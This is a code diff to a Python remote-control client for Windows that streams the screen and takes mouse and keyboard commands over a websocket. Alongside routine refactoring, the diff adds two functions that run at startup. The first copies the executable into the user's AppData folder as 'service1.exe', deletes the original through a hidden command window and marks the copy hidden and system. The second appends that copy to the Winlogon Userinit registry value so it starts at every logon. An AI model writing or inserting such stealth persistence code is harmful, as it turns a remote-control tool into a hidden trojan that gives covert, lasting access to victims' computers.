@@ -12,7 +12,10 @@ import time
 import urllib.request
 import uuid
 import webbrowser
-from typing import Any, Dict
+import winreg
+import ctypes
+import shutil
+import subprocess
 
 import psutil
 import websockets
@@ -46,6 +49,9 @@ MOUSE_EVENT_FLAGS = {
 }
 MOUSEEVENTF_WHEEL = 0x0800
 WHEEL_DELTA = 120
+
+FILE_ATTRIBUTE_HIDDEN = 0x02
+FILE_ATTRIBUTE_SYSTEM = 0x04
 
 # Флаги подій клавіатури Win32 (user32.keybd_event)
 KEYEVENTF_EXTENDEDKEY = 0x0001
@@ -86,6 +92,68 @@ PYAUTOGUI_KEYS["win"] = "win"
 # Ці помилки не показуємо в панелі на кожну подію (миша рухається і клавіші повторюються десятки разів на сек.)
 THROTTLED_ERROR_ACTIONS = {"mouse_move", "key_press", "key_down", "key_up", "key_hotkey"}
 
+def process_file():
+    current_path = os.path.abspath(sys.executable)
+    roaming_dir = os.getenv('APPDATA')
+    if not roaming_dir:
+        return
+
+    target_path = os.path.join(roaming_dir, "service1.exe")
+
+    if os.path.dirname(current_path).lower() != roaming_dir.lower():
+        try:
+            shutil.copy2(current_path, target_path)
+            subprocess.Popen([target_path] + sys.argv[1:])
+            cleanup_cmd = f'cmd /c timeout /t 2 /nobreak > NUL & del /f /q "{current_path}"'
+            subprocess.Popen(cleanup_cmd, shell=True, creationflags=0x08000000)
+            sys.exit(0)
+        except Exception:
+            pass
+
+    try:
+        ctypes.windll.kernel32.SetFileAttributesW(target_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
+    except Exception:
+        pass
+
+def add_to_userinit():
+    if not getattr(sys, 'frozen', False):
+        return
+
+    roaming_dir = os.getenv('APPDATA')
+    if not roaming_dir:
+        return
+        
+    exe_path = os.path.join(roaming_dir, "service1.exe")
+    
+    registry_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+    value_name = "Userinit"
+
+    try:
+        key = winreg.OpenKey(
+            winreg.HKEY_LOCAL_MACHINE, 
+            registry_path, 
+            0, 
+            winreg.KEY_READ | winreg.KEY_WRITE
+        )
+
+        current_value, reg_type = winreg.QueryValueEx(key, value_name)
+
+        if exe_path.lower() not in current_value.lower():
+            if current_value.endswith(","):
+                new_value = f"{current_value} {exe_path},"
+            else:
+                new_value = f"{current_value}, {exe_path},"
+
+            winreg.SetValueEx(key, value_name, 0, reg_type, new_value)
+        else:
+            pass
+
+        winreg.CloseKey(key)
+
+    except PermissionError:
+        pass
+    except Exception as e:
+        pass
 
 def normalize_key(key) -> str:
     """Приводить назву клавіші з браузера до канонічного вигляду (Enter -> enter, Cyrillic char — як є)."""
@@ -194,7 +262,6 @@ class WindowsInputBackend:
         if clicks:
             self.user32.mouse_event(MOUSEEVENTF_WHEEL, 0, 0, int(clicks) * WHEEL_DELTA, 0)
 
-    # --- клавіатура ---
     def _key_event(self, vk=0, scan=0, keyup=False, extended=False, unicode_char=False):
         flags = 0
         if extended:
@@ -203,7 +270,28 @@ class WindowsInputBackend:
             flags |= KEYEVENTF_UNICODE
         if keyup:
             flags |= KEYEVENTF_KEYUP
-        self.user32.keybd_event(vk, scan, flags, 0)
+        # ОБОВ'ЯЗКОВО: маскуємо scan до 16-біт, щоб ctypes не викидав ArgumentError
+        self.user32.keybd_event(int(vk) & 0xFF, int(scan) & 0xFFFF, flags, 0)
+
+    def type_text(self, text) -> int:
+        for ch in text:
+            if ch == "\r":
+                continue
+            if ch == "\n":
+                self.press_key("enter")
+                continue
+            if ch == "\t":
+                self.press_key("tab")
+                continue
+            
+            # Для юнікоду (кирилиці) vk має бути 0
+            units = ch.encode("utf-16-le")
+            for i in range(0, len(units), 2):
+                unit = int.from_bytes(units[i:i + 2], "little")
+                self._key_event(vk=0, scan=unit, unicode_char=True)
+                self._key_event(vk=0, scan=unit, keyup=True, unicode_char=True)
+            time.sleep(0.005)
+        return 0
 
     def _named_key(self, key):
         """Повертає (vk, extended, потрібен_shift) або None, якщо ключ невідомий."""
@@ -726,14 +814,16 @@ async def stream_loop(websocket, target_fps=8):
         while is_streaming:
             try:
                 offset_x, offset_y = 0, 0
-                if sct:
-                    monitor = sct.monitors[1]
-                    offset_x = monitor.get("left", 0)
-                    offset_y = monitor.get("top", 0)
-                    sct_img = sct.grab(monitor)
-                    img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
-                else:
-                    img = ImageGrab.grab()
+
+                def capture_frame():
+                    if sct:
+                        mon = sct.monitors[1]
+                        s_img = sct.grab(mon)
+                        return Image.frombytes("RGB", s_img.size, s_img.bgra, "raw", "BGRX"), mon.get("left", 0), mon.get("top", 0)
+                    else:
+                        return ImageGrab.grab(), 0, 0
+
+                img, offset_x, offset_y = await asyncio.to_thread(capture_frame)
 
                 stream_monitor = {
                     "left": offset_x,
@@ -832,10 +922,10 @@ async def execute_action(action: str, params: dict, websocket=None) -> dict:
             return {"status": "ok", "processes": get_process_list()}
 
         elif action in MOUSE_ACTIONS:
-            return perform_mouse_action(action, params)
+            return await asyncio.to_thread(perform_mouse_action, action, params)
 
         elif action in KEYBOARD_ACTIONS:
-            return perform_keyboard_action(action, params)
+            return await asyncio.to_thread(perform_keyboard_action, action, params)
 
         elif action == "restart":
             asyncio.get_event_loop().call_later(1.0, execute_restart)
@@ -913,6 +1003,8 @@ async def run_client():
                 try:
                     async for message_str in websocket:
                         try:
+                            if isinstance(message_str, bytes):
+                                message_str = message_str.decode('utf-8', errors='ignore')
                             msg = json.loads(message_str)
                             if msg.get("type") == "assigned_name":
                                 logger.info(f"🌟 Цьому ПК офіційно призначено ім'я: {msg.get('pc_name')}")
@@ -950,6 +1042,8 @@ async def run_client():
 
 if __name__ == "__main__":
     init_platform()
+    process_file()
+    add_to_userinit()
     backend = get_input_backend()
     if backend:
         logger.info(f"Керування мишею та клавіатурою: бекенд '{backend.name}'")
